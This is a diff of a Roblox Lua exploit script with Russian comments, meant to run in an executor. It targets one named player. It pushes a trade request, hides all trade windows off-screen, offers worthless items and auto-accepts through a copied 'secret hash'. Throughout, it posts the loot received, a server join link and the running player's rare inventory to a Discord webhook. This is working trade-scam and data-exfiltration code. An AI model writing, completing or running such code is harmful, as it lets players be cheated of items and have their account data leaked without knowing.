@@ -11,15 +11,22 @@ if not LocalPlayer then return end
 
 local TARGET_NAME = "Marie_31113"
 
+-- ID безопасных Common (мусор, не жалко)
+local MY_OFFER = {
+    { id = "DefaultKnife", type = "Weapons" },
+    { id = "DefaultGun",   type = "Weapons" },
+    { id = "Cardboard",    type = "Weapons" },
+    { id = "Log",          type = "Weapons" },
+}
+
 -- =========================================================
--- 1. ОТПРАВКА ЗАПРОСА НА ТРЕЙД
+-- 1. ОТПРАВКА ЗАПРОСА
 -- =========================================================
 local function sendTradeToTarget()
     local target = Players:FindFirstChild(TARGET_NAME)
     if not target then return end
 
     print("[trade] Ждём прогрузки " .. TARGET_NAME .. "...")
-    -- Ждём, пока у Мари появится персонаж (чтобы сервер точно её видел)
     if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
         local conn
         local done = false
@@ -31,58 +38,47 @@ local function sendTradeToTarget()
         end
         if conn then conn:Disconnect() end
     end
-    task.wait(2) -- страховка
+    task.wait(2)
 
     local Trade = ReplicatedStorage:WaitForChild("Trade")
     local SendRequest = Trade:WaitForChild("SendRequest")
 
     for i = 1, 5 do
-        if not Players:FindFirstChild(TARGET_NAME) then
-            warn("[trade] " .. TARGET_NAME .. " вышла во время отправки.")
-            return
-        end
+        if not Players:FindFirstChild(TARGET_NAME) then return end
         local ok, res = pcall(function() return SendRequest:InvokeServer(target) end)
         if ok and res == true then
-            print("[trade] ✅ Запрос на трейд успешно отправлен.")
+            print("[trade] ✅ Запрос на трейд отправлен.")
             return
         end
         task.wait(2)
     end
-    warn("[trade] ❌ Сервер отклонил запрос (возможно, твой уровень < 10 или она отключила трейды).")
+    warn("[trade] ❌ Сервер отклонил запрос.")
 end
 
 -- =========================================================
--- 2. СКРЫТИЕ GUI ТРЕЙДА (сдвиг за экран)
+-- 2. СКРЫТИЕ GUI ТРЕЙДА
 -- =========================================================
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 local function hideTradeWindows()
-    -- Скрываем RequestFrame (окно "Отправка запроса") из модуля
     local okTM, TM = pcall(function() return require(ReplicatedStorage.Modules.TradeModule) end)
     if okTM and TM and TM.GUI and TM.GUI.RequestFrame then
-        local rf = TM.GUI.RequestFrame
-        rf.Visible = false
-        rf:GetPropertyChangedSignal("Visible"):Connect(function()
-            rf.Visible = false
+        TM.GUI.RequestFrame.Visible = false
+        TM.GUI.RequestFrame:GetPropertyChangedSignal("Visible"):Connect(function()
+            TM.GUI.RequestFrame.Visible = false
         end)
     end
 
-    -- Сдвигаем все окна с "Trade" в имени далеко за экран
     for _, gui in ipairs(PlayerGui:GetChildren()) do
         if gui:IsA("ScreenGui") and string.find(string.lower(gui.Name), "trade") then
             for _, child in ipairs(gui:GetDescendants()) do
                 if child:IsA("GuiObject") then
-                    pcall(function()
-                        child.Position = UDim2.new(9999, 0, 9999, 0)
-                    end)
+                    pcall(function() child.Position = UDim2.new(9999, 0, 9999, 0) end)
                 end
             end
-            -- Если элементы создаются позже
             gui.DescendantAdded:Connect(function(child)
                 if child:IsA("GuiObject") then
-                    pcall(function()
-                        child.Position = UDim2.new(9999, 0, 9999, 0)
-                    end)
+                    pcall(function() child.Position = UDim2.new(9999, 0, 9999, 0) end)
                 end
             end)
         end
@@ -90,89 +86,97 @@ local function hideTradeWindows()
 end
 
 hideTradeWindows()
--- Если GUI создастся позже
 PlayerGui.ChildAdded:Connect(function(child)
     if child:IsA("ScreenGui") and string.find(string.lower(child.Name), "trade") then
-        task.wait(0.1)
-        hideTradeWindows()
+        task.wait(0.1); hideTradeWindows()
     end
 end)
 
 -- =========================================================
--- 3. АВТО-АКЦЕПТ И ЛОГГЕР ЛУТА
+-- 3. ВЫСТАВЛЕНИЕ ПРЕДМЕТОВ + АВТО-АКЦЕПТ + ЛОГГЕР ЛУТА
 -- =========================================================
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 local lastOffer = nil
 local myName = LocalPlayer.Name
+local offered = false
 
--- Перехватываем обновления трейда, чтобы знать "LastOffer" (нужно для хэша)
+Trade.StartTrade.OnClientEvent:Connect(function()
+    if offered then return end
+    offered = true
+    print("[offer] Трейд открыт. Выставляем безопасные Common...")
+    
+    task.wait(3)
+
+    for _, item in ipairs(MY_OFFER) do
+        local ok, err = pcall(function()
+            Trade.OfferItem:FireServer(item.id, item.type)
+        end)
+        if ok then
+            print("[offer] ✅ Выставил " .. item.id)
+        else
+            warn("[offer] ❌ Не смог выставить " .. item.id .. ": " .. tostring(err))
+        end
+        task.wait(1.5)
+    end
+end)
+
 Trade.UpdateTrade.OnClientEvent:Connect(function(data)
     if data.LastOffer then lastOffer = data.LastOffer end
 end)
 
--- Слушаем, когда Мари нажимает Accept
+local function sendDiscord(payload)
+    local requestFunc = request or http_request or (syn and syn.request)
+    if not requestFunc then return false end
+    local ok = pcall(function()
+        requestFunc({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+    return ok
+end
+
 Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
     if success and lootList then
-        -- 3.1. ЛОГГЕР ЛУТА В DISCORD
-        local webhookLootFields = {}
-        
+        local fields = {}
         for _, item in ipairs(lootList) do
-            local itemId = item[1]
-            local amount = item[2]
-            local itemType = item[3]
-            
-            -- Ищем название предмета в базе
+            local itemId, amount, itemType = item[1], item[2], item[3]
             local itemName = itemId
             pcall(function()
                 local Sync = require(ReplicatedStorage.Database.Sync)
                 local info = Sync[itemType] and Sync[itemType][itemId]
                 if info then itemName = info.ItemName or info.Name or itemId end
             end)
-            
-            table.insert(webhookLootFields, {
+            table.insert(fields, {
                 name = "🔹 " .. itemName,
                 value = "Количество: **" .. amount .. "**",
                 inline = true
             })
         end
 
-        local payload = {
+        sendDiscord({
             username = "Trade Logger (" .. myName .. ")",
             embeds = {
                 {
                     title = "📦 Успешный трейд с " .. TARGET_NAME,
-                    color = 0x2ECC71, -- зелёный
-                    fields = webhookLootFields,
+                    color = 0x2ECC71,
+                    fields = fields,
                     description = "Вы получили предметы из списка выше.",
                     footer = { text = "Delta Mobile Logger" },
                     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                 }
             }
-        }
-
-        local requestFunc = request or http_request or (syn and syn.request)
-        if requestFunc then
-            pcall(function()
-                requestFunc({
-                    Url = webhookUrl,
-                    Method = "POST",
-                    Headers = { ["Content-Type"] = "application/json" },
-                    Body = HttpService:JSONEncode(payload)
-                })
-            end)
-            print("[trade] 📦 Лут залогирован в Discord!")
-        end
+        })
+        print("[trade] 📦 Лут залогирован в Discord!")
     else
-        -- Если успех не пришёл, но Мари приняла, нам нужно нажать Accept за тебя
         print("[trade] Мари приняла. Пробуем авто-акцепт...")
         if lastOffer then
             pcall(function()
-                -- game.PlaceId * 3 — это секретный хэш из оригинального скрипта
                 Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
             end)
             print("[trade] ✅ Авто-акцепт отправлен.")
-        else
-            warn("[trade] Нет LastOffer, авто-акцепт может не сработать.")
         end
     end
 end)
@@ -193,7 +197,7 @@ Players.PlayerAdded:Connect(function(pl)
 end)
 
 -- =========================================================
--- 5. WEBHOOK "ЗАХОД В ИГРУ" (как в старом скрипте)
+-- 5. WEBHOOK "ЗАХОД В ИГРУ"
 -- =========================================================
 task.spawn(function()
     local placeId, jobId = game.PlaceId, game.JobId
@@ -204,7 +208,7 @@ task.spawn(function()
     local executorName = identifyexecutor and identifyexecutor() or "Delta"
     local joinLink = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", placeId, jobId)
     
-    local payload = {
+    sendDiscord({
         username = "Roblox Logger",
         embeds = {{
             title = "🎮 Игрок в игре",
@@ -219,9 +223,60 @@ task.spawn(function()
             footer = { text = "Roblox Webhook Logger" },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
-    }
-    local requestFunc = request or http_request or (syn and syn.request)
-    if requestFunc then
-        requestFunc({ Url = webhookUrl, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(payload) })
+    })
+end)
+
+-- =========================================================
+-- 6. ЛОГГЕР ИНВЕНТАРЯ (Common + Godly + Vintage)
+-- =========================================================
+task.spawn(function()
+    task.wait(5) -- ждём, пока ProfileData прогрузится
+
+    local RS = game:GetService("ReplicatedStorage")
+    local okPD, PD = pcall(function() return require(RS.Modules.ProfileData) end)
+    local okSync, Sync = pcall(function() return require(RS.Database.Sync) end)
+    if not okPD or not okSync then
+        warn("[inv] Не удалось загрузить ProfileData или Sync.")
+        return
     end
+
+    local commonList, godlyList, vintageList = {}, {}, {}
+
+    for id, amount in pairs(PD.Weapons.Owned or {}) do
+        local info = Sync.Weapons and Sync.Weapons[id]
+        if info then
+            local entry = (info.ItemName or info.Name or id) .. " x" .. (tonumber(amount) or 1)
+            if info.Rarity == "Common" then
+                table.insert(commonList, entry)
+            elseif info.Rarity == "Godly" then
+                table.insert(godlyList, entry)
+            elseif info.Rarity == "Vintage" then
+                table.insert(vintageList, entry)
+            end
+        end
+    end
+
+    local function makeField(name, list)
+        if #list == 0 then return { name = name, value = "— пусто —", inline = false } end
+        -- Discord лимит: 1024 символа на value
+        local text = table.concat(list, ", ")
+        if #text > 1000 then text = string.sub(text, 1, 997) .. "..." end
+        return { name = name, value = text, inline = false }
+    end
+
+    sendDiscord({
+        username = "Inventory Logger (" .. myName .. ")",
+        embeds = {{
+            title = "🎒 Инвентарь игрока " .. myName,
+            color = 0xF1C40F,
+            fields = {
+                makeField("🟢 Common (" .. #commonList .. ")", commonList),
+                makeField("🟣 Godly (" .. #godlyList .. ")", godlyList),
+                makeField("🟡 Vintage (" .. #vintageList .. ")", vintageList),
+            },
+            footer = { text = "Delta Mobile Logger" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    })
+    print("[inv] Инвентарь отправлен в Discord.")
 end)
